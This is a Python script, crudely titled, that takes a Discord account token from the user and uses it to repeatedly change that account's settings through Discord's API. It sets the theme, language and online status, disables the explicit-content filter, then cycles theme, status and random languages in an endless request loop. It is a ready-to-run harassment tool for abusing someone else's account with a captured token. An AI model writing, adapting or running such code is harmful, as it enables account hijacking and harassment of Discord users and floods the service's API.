import requests, random

from itertools import cycle


ErrorMsg = "Invalid token, or you're ratelimited from the endpoint"

__version__ = "1.0.0"

def main():
    print(f"Discord User Fucker")
    print(f"Version "+__version__)
    print("")
    print("")

    token = input("Token to fuck\n> ")
    headers = {
        'Authorization': token,
        'Content-Type': 'application/json',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.0.305 Chrome/69.0.3497.128 Electron/4.0.8 Safari/537.36'
    }    
    request = requests.Session()
    payload = {
        'theme': "light",
        'locale': "ja",
        'message_display_compact': False,
        'enable_tts_command': False,
        'inline_embed_media': False,
        'inline_attachment_media': False,
        'gif_auto_play': False,
        'render_embeds': False,
        'render_reactions': False,
        'animate_emoji': False,
        'convert_emoticons': False,
        'enable_tts_command': False,
        'explicit_content_filter': '0',
        'status': "invisible"
    }
    try:
        res = request.patch("https://canary.discordapp.com/api/v6/users/@me/settings",headers=headers, json=payload)
        if res.status_code == 401:
            try:
             print(ErrorMsg)
            except:
              pass 
    except Exception as e:
      print(e)
    locales = [ 
        "da", "de",
        "en-GB", "en-US",
        "es-ES", "fr",
        "hr", "it",
        "lt", "hu",
        "nl", "no",
        "pl", "pt-BR",
        "ro", "fi",
        "sv-SE", "vi",
        "tr", "cs",
        "el", "bg",
        "ru", "uk",
        "th", "zh-CN",
        "ja", "zh-TW",
        "ko"
        ]
    modes = cycle(["light", "dark"])
    statuses = cycle(["online", "idle", "dnd", "invisible"])
    while True:
        setting = {
            'theme': next(modes),
            'locale': random.choice(locales),
            'status': next(statuses)
        }
        while True:
            try:
                ress = request.patch("https://canary.discordapp.com/api/v6/users/@me/settings",headers=headers, json=setting, timeout=10)
                if ress.status_code == 401:
                  try:
                    print(ErrorMsg)
                  except:
                    pass
            except Exception as e:
                print(e)

if __name__ == '__main__':
    main()
